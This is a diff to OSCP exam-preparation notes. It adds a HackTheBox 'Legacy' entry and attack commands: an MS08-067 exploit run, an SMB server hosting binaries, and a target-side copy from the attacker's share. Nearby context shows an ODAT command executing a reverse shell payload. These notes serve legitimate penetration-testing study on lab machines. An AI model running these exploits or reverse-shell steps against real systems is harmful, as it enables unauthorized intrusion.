@@ -79,13 +79,14 @@ https://github.com/tedchen0001/OSCP-Notes/blob/master/AD.md
 | Granny | Windows Server 2003, IIS WebDAV CVE-2017-7269 | WMI Service Isolation Privilege Escalation (churrasco) ||
 | *Intelligence | username(pdf creator), add AD Integrated DNS records  | group ReadGMSAPassword | :white_check_mark: |
 | Jerry | Tomcat default credential, deploy | no need ||
+| Legacy | MS08-067, MS17-010 | no need ||
 | Love | SSRF Gopher MySQL | AlwaysInstallElevated ||
 | Omni | IoT exploit | *SAM SYSTEM hash, Export-Clixml, GetNetworkCredential ||
 | Optimum | HttpFileServer 2.3 | MS16-098 ||
 | Remote | NFS Service(default port 2049), mount, sdf, Umbraco CMS | SeImpersonatePrivilege, TeamViewer |
 | SecNotes | CSRF reset password link, smb, IIS php | WinPEAS Linux shells/distributions ||
 | Silo | Oracle (default port 1521), CVE-2012-1675, ODAT, brute-force | Oracle, SYSTEM Privilege ||
-| Worker | SVN(default port 3690), revision, Azure DevOps,  new branch,  <br>additional drives, evil-winrm | Azure DevOps, PowerShell task ||  
+| Worker | SVN(default port 3690), revision, Azure DevOps,  new branch,  <br>additional drives, evil-winrm | Azure DevOps, PowerShell task ||
 
 (*):review before the exam
 
@@ -347,6 +348,24 @@ Used in ```Jerry```
 https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown
 ```
 
+Used in ```Legacy```
+
+https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py
+
+attacker 
+
+```shell
+# Windows XP SP3 English (NX) = 6
+python2 ms08-067.py <target ip> 6 <target port>
+python2 smbserver.py public /usr/share/windows-resources/binaries/
+```
+
+target
+
+```
+copy \\<attacker ip>\whoami.exe C:\windows\temp
+```
+
 Used in ```Love```
 
 SSRF payload
@@ -399,3 +418,4 @@ python3 odat.py utlfile -s <target ip> -p <target port> -U <username> -P <passwo
 # execute reverse shell payload
 python3 odat.py externaltable -s <target ip> -p <target port> -U <username> -P <password> -d <sid> --sysdba --exec c:/ shell-x64.exe
 ```
+
